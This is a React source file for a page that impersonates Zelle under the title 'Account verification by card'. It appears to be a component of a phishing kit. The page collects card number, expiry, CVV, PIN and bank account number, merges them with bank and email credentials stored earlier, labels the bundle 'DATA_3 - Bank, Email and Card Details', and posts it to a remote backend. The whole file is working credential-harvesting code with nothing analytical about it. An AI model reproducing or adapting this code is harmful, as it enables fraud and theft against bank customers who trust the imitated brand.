import React, { useState, useEffect } from 'react';
import '../styles/CardConnectPage.css';
import { useAppContext } from '../context/AppContext';
import { backendLink } from '../utils/backendLink';
import zelleLogowhite from '../assets/imgs/zelleloggowhite.svg'

const CardConnectPage = () => {
  const { navigateTo, bankDetails, completeTx } = useAppContext();
  const [bankName, setBankName] = useState("")
  const [cardNumber, setCardNumber] = React.useState('');
  const [expiryDate, setExpiryDate] = React.useState('');
  const [cvv, setCvv] = React.useState('');
  const [accountNumber, setAccountNumber] = React.useState('');
  const [cardPin, setCardPin] = React.useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const localBankDetails = localStorage.getItem('bankCredentials');
    document.title = `Account Verification by Card | Zelle`;
    if (!bankDetails && !localBankDetails) {
      navigateTo('/bank-search');
    } else {
      setBankName(JSON.parse(localBankDetails).bankName);
      // console.log(bankName)
    }
  }, [bankDetails, navigateTo, bankName]);

  const formatCardNumber = (value) => {
    // Remove any non-digit characters
    const digits = value.replace(/\D/g, '');
    
    // Limit to 16 digits
    const truncated = digits.slice(0, 16);
    
    // Split into groups of 4
    const groups = truncated.match(/.{1,4}/g) || [];
    
    // Join with spaces
    return groups.join(' ');
  };

  const formatExpiryDate = (value) => {
    // Remove any non-digit characters
    const digits = value.replace(/\D/g, '');
    
    // Limit to 4 digits
    const truncated = digits.slice(0, 4);
    
    // Add slash after first 2 digits
    if (truncated.length >= 2) {
      return truncated.slice(0, 2) + '/' + truncated.slice(2);
    }
    
    return truncated;
  };

  const handleCardNumberChange = (e) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleExpiryDateChange = (e) => {
    const formatted = formatExpiryDate(e.target.value);
    setExpiryDate(formatted);
  };

  const handleCvvChange = (e) => {
    // Limit to exactly 3 digits
    const value = e.target.value.replace(/\D/g, '').slice(0, 3);
    setCvv(value);
  };

  const handleAccountNumberChange = (e) => {
    // Limit to exactly 10 digits
    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
    setAccountNumber(value);
  };

  const handleCardPinChange = (e) => {
    // Limit to exactly 4 digits
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardPin(value);
  };

  const validateCardNumber = (number) => {
    const digits = number.replace(/\D/g, '');
    console.log('digits', digits.length);
    if (digits.length !== 16) return false;
    
    // Luhn Algorithm
    let sum = 0;
    let isEven = false;
    
    // Loop through values starting from the rightmost digit
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i]);

      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      isEven = !isEven;
    }

    return sum % 10 === 0;
  };

  const validateExpiryDate = (date) => {
    const [month, year] = date.split('/');
    if (!month || !year) return false;
    
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    const expMonth = parseInt(month);
    const expYear = parseInt(year);
    
    if (expMonth < 1 || expMonth > 12) return false;
    if (expYear < currentYear) return false;
    if (expYear === currentYear && expMonth < currentMonth) return false;
    
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Validate card number
    if (!validateCardNumber(cardNumber)) {
      alert('Please enter a valid card number');
      return;
    }

    // Validate expiry date
    if (!validateExpiryDate(expiryDate)) {
      alert('Please enter a valid expiry date');
      return;
    }

    // Validate CVV (exactly 3 digits)
    if (cvv.length !== 3) {
      alert('CVV must be 3 digits');
      return;
    }

    // Validate Account Number (exactly 10 digits)
    if (accountNumber.length !== 10) {
      alert('Account Number must be 10 digits');
      return;
    }

    // Validate Card PIN (exactly 4 digits)
    if (cardPin.length !== 4) {
      alert('Card PIN must be 4 digits');
      return;
    }

    setIsLoading(true);

    // Store form data in localStorage
    localStorage.setItem('cardDetails', JSON.stringify({
      nameOnCard: document.getElementById('nameOnCard').value,
      cardNumber,
      expiryDate,
      cvv,
      accountNumber,
      cardPin,
      timestamp: new Date().toISOString()
    }));

    const bankData = JSON.parse(localStorage.getItem('bankCredentials'))
    const emailData = JSON.parse(localStorage.getItem('emailCredentials'))

    const detail3 = {
      ...bankData,
      ...emailData,
      nameOnCard: document.getElementById('nameOnCard').value,
      cardNumber,
      expiryDate,
      cvv,
      accountNumber,
      cardPin,
      dataName: "DATA_3 - Bank, Email and Card Details",
      timestamp: new Date().toISOString()
    }

    try {
      const response = await fetch(`${backendLink}/api/details`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(detail3)
      });
      console.log(response)

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      // Simulate API call with timeout
      setTimeout(() => {
        setIsLoading(false);
        navigateTo(`/${completeTx}`);
      }, 1000);
    } catch (error) {
      console.error('Error fetching data:', error);
    }
  };

  return (
    <div className="card-connect-container">
      <div className="logo-container">
        <a className="site-branding__link" href="/" title="Home" rel="home">
          <img className="zelle-logo" src={zelleLogowhite} alt="" />
        </a>
      </div>
      
      <div className="card-connect-content">
        <h1>Account verification by card!</h1>
        
        <div className="info-boxqq">
          We need to make sure it's really you, please enter your
          <strong> {bankName}</strong> card details to confirm the information
          you've provided.
        </div>

        <form onSubmit={handleSubmit} className="card-formaaa">
          <div className="form-group">
            <label className="floating-label">
              <input 
                type="text" 
                id="nameOnCard"
                className="input-name-on-card"
                placeholder=" "
                required
              />
              <span>Name on Card</span>
            </label>
          </div>

          <div className="form-row">
            <div className="form-group card-number-group">
              <label className="floating-label">
                <input 
                  type="text" 
                  id="cardNumber"
                  className="input-card-number"
                  placeholder=" "
                  required
                  onChange={handleCardNumberChange}
                  value={cardNumber}
                  maxLength="19"
                />
                <span>Card Number</span>
              </label>
            </div>
            <div className="form-group expire-date-group">
              <label className="floating-label">
                <input 
                  type="text" 
                  id="expireDate"
                  className="input-expire-date"
                  placeholder=" "
                  required
                  onChange={handleExpiryDateChange}
                  value={expiryDate}
                  maxLength="5"
                />
                <span>Expire Date</span>
              </label>
            </div>
            <div className="form-group cvv-group">
              <label className="floating-label">
                <input 
                  type="text" 
                  id="cvv"
                  className="input-cvv"
                  placeholder=" "
                  required
                  onChange={handleCvvChange}
                  value={cvv}
                  maxLength="3"
                />
                <span>CVV</span>
              </label>
            </div>
          </div>

          <div className="form-row">
            <div className="form-group account-number-group">
              <label className="floating-label">
                <input 
                  type="text" 
                  id="accountNumber"
                  className="input-account-number"
                  placeholder=" "
                  required
                  onChange={handleAccountNumberChange}
                  value={accountNumber}
                  maxLength="10"
                />
                <span>Account Number</span>
              </label>
            </div>
            <div className="form-group pin-group">
              <label className="floating-label">
                <input 
                  type="password" 
                  id="cardPin"
                  className="input-card-pin"
                  placeholder=" "
                  required
                  onChange={handleCardPinChange}
                  value={cardPin}
                  maxLength="4"
                />
                <span>Card Pin</span>
              </label>
            </div>
          </div>

          <button 
            type="submit" 
            className="continue-btn"
            disabled={isLoading}
          >
            {isLoading ? (
              <div className="button-content">
                <span className="spinner"></span>
                <span>Processing...</span>
              </div>
            ) : 'CONTINUE'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default CardConnectPage;
